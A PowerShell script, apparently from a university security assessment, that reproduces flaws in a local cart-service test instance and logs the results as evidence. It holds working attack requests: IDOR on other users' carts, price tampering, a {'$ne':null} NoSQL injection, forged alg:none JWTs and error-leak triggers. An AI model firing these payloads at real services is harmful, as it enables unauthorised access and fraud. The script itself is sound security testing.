# =====================================================================
# evidence-dynamic-cart.ps1
# SE4030 - Black-box (dynamic) reproduction of vulnerabilities in
# cart-service. Targets a TEMP instance, default http://localhost:3105
# (platoo_cart_scan database). Run ONLY against this temp instance.
# Run:  powershell -ExecutionPolicy Bypass -File evidence-dynamic-cart.ps1
# Writes evidence into <repo>/hiruni docs/security/evidence/EV-C<n>-*.txt
# NOTE: JSON bodies are written to temp files and sent with
# --data-binary "@file" because PowerShell 5.1 strips inner double-quotes
# when passing inline JSON as an argument to native curl.exe.
# =====================================================================
param(
  [string]$BaseUrl = 'http://localhost:3105'
)
$ErrorActionPreference = 'Stop'
$evid = Join-Path $PSScriptRoot '..\evidence'
if (-not (Test-Path $evid)) { New-Item -ItemType Directory -Path $evid -Force | Out-Null }
$tmp = Join-Path $env:TEMP 'opencode'
if (-not (Test-Path $tmp)) { New-Item -ItemType Directory -Path $tmp -Force | Out-Null }
$stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'

function New-EvidenceFile {
  param([string]$Name, [string]$Title, [string]$Request)
  $f = Join-Path $evid $Name
  "================================================================" | Set-Content $f
  "$Title  [$stamp]" | Add-Content $f
  "Target: $BaseUrl  (temporary scan instance, dedicated scan DB)" | Add-Content $f
  "================================================================`n" | Add-Content $f
  '---- REQUEST ----' | Add-Content $f
  $Request | Add-Content $f
  '---- RESPONSE ----' | Add-Content $f
  return $f
}

function Send-Json {
  param([string]$Url, [string]$Json, [switch]$GetOnly, [string]$AuthHeader)
  $bf = Join-Path $tmp ("body-{0}.json" -f ([guid]::NewGuid().ToString('N')))
  Set-Content -Path $bf -Value $Json -NoNewline -Encoding ascii
  if ($AuthHeader) {
    curl.exe -s -X POST $Url -H 'Content-Type: application/json' -H $AuthHeader --data-binary "@$bf"
  } elseif ($GetOnly) {
    curl.exe -s "$Url"
  } else {
    curl.exe -s -X POST $Url -H 'Content-Type: application/json' --data-binary "@$bf"
  }
}

# ---- EV-C6 Verbose error stack trace (malformed JSON) ----
$f = New-EvidenceFile 'EV-C6-cart-stacktrace.txt' 'EV-C6 : Verbose errors - Express default error page with full stack trace (no NODE_ENV=production)' "curl.exe -s -X POST $BaseUrl/api/cart/add -H 'Content-Type: application/json' --data-binary @file (body: {broken)"
Set-Content -Path (Join-Path $tmp 'broken.json') -Value '{broken' -NoNewline
curl.exe -s -o NUL -w 'HTTP %{http_code}`n' -X POST "$BaseUrl/api/cart/add" -H 'Content-Type: application/json' --data-binary "@$(Join-Path $tmp 'broken.json')" | Add-Content $f
'(full stack trace, first 3000 chars)' | Add-Content $f
$r = curl.exe -s -X POST "$BaseUrl/api/cart/add" -H 'Content-Type: application/json' --data-binary "@$(Join-Path $tmp 'broken.json')"
$out = if ($r.Length -gt 3000) { $r.Substring(0,3000) } else { $r }; $out | Add-Content $f
Write-Output "wrote $f"

# ---- EV-C1 IDOR: create victim cart, read it, poison it (no auth) ----
$f = New-EvidenceFile 'EV-C1-cart-idor.txt' 'EV-C1 : IDOR - unauthenticated read & modification of another user''s cart' "POST $BaseUrl/api/cart/add body: {userId:'victim-100', productId:'item-1', name, price, quantity}"
'--- 1. Attacker creates a cart for victim-100 (identity fully client-controlled, no auth) ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"victim-100","productId":"item-1","name":"Chicken Burger","price":1200,"quantity":2,"image":"http://localhost:3001/uploads/b.png"}' | Add-Content $f
'--- 2. Attacker reads victim-100 cart with no auth (GET /api/cart/:userId) ---' | Add-Content $f
curl.exe -s "$BaseUrl/api/cart/victim-100" | Add-Content $f
'--- 3. Attacker adds a tampered-price item into victim-100 cart ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"victim-100","productId":"Poison","name":"paid-by-victim","price":1,"quantity":1}' | Add-Content $f
'--- 4. Attacker removes an item from victim-100 cart ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/remove" -Json '{"userId":"victim-100","productId":"item-1"}' | Add-Content $f
Write-Output "wrote $f"

# ---- EV-C2 Client-controlled price/quantity tampering ----
$f = New-EvidenceFile 'EV-C2-cart-price-tamper.txt' 'EV-C2 : Client-controlled price & negative quantity stored (price tampering)' "POST $BaseUrl/api/cart/add with price:1 and price:-500"
'--- price:1 accepted and stored ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"tamper-user","productId":"t1","name":"Milkshake","price":1,"quantity":1}' | Add-Content $f
'--- negative price -500 accepted and stored ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"tamper-user","productId":"t2","name":"NEG","price":-500,"quantity":1}' | Add-Content $f
'--- quantity:0 (should be rejected by schema min:1) ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"tamper-user","productId":"t3","name":"ZERO","price":10,"quantity":0}' | Add-Content $f
Write-Output "wrote $f"

# ---- EV-C3 NoSQL injection via $ne in userId ----
$f = New-EvidenceFile 'EV-C3-cart-nosql-injection.txt' 'EV-C3 : NoSQL injection - $ne operator in userId bypasses the filter and accesses/modifies another user''s cart' 'HTTP reproduction (curl): seed victim cart, then POST body: {"userId":{"$ne":null},...}'
'--- 1. Seed a victim-200 cart (curl) ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"victim-200","productId":"top-secret","name":"Victim Secret Item","price":999,"quantity":3}' | Add-Content $f
'--- 2. Attacker sends userId:{$ne:null}. EXPECT: rejection or attacker-only access. ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":{"$ne":null},"productId":"x","name":"injected","price":99,"quantity":1}' | Add-Content $f
'--- 3. OBSERVED: response is the seeded victim-200 cart with attacker''s "injected" item appended -> cross-user WRITE. $ne bypassed the userId filter (no auth needed). ---' | Add-Content $f
Write-Output "wrote $f"

# ---- EV-C4 Verbose error leak (validation error objects) ----
$f = New-EvidenceFile 'EV-C4-cart-verbose-errors.txt' 'EV-C4 : Verbose error handling - full Mongoose validation error echoed to client' "POST $BaseUrl/api/cart/add body {userId:'err-user',...,quantity:0}"
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"err-user","productId":"e1","name":"x","price":10,"quantity":0}' | Add-Content $f
'--- empty body ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/cart/add" -Json '{}' | Add-Content $f
Write-Output "wrote $f"

# ---- EV-C5 JWT never verified (garbage + alg:none accepted) ----
$f = New-EvidenceFile 'EV-C5-cart-jwt-not-verified.txt' 'EV-C5 : JWT authentication absent - garbage & alg-none tokens accepted' "POST $BaseUrl/api/cart/add with -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJleHAiOjF9.' (alg:none, expired)"
$b = Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"jwt-none","productId":"n","name":"n","price":1,"quantity":1}' -AuthHeader 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJleHAiOjF9.'
$out2 = if ($b.Length -gt 120) { $b.Substring(0,120) } else { $b }; "alg:none, exp=1 -> request accepted -> $out2" | Add-Content $f
$b2 = Send-Json -Url "$BaseUrl/api/cart/add" -Json '{"userId":"jwt-garbage","productId":"n","name":"n","price":1,"quantity":1}' -AuthHeader 'Authorization: Bearer garbage.garbage.garbage'
$out3 = if ($b2.Length -gt 120) { $b2.Substring(0,120) } else { $b2 }; "garbage token -> request accepted -> $out3" | Add-Content $f
'Conclusion: Authorization header is ignored entirely (no middleware).' | Add-Content $f
Write-Output "wrote $f"

Write-Output 'cart dynamic evidence capture complete.'
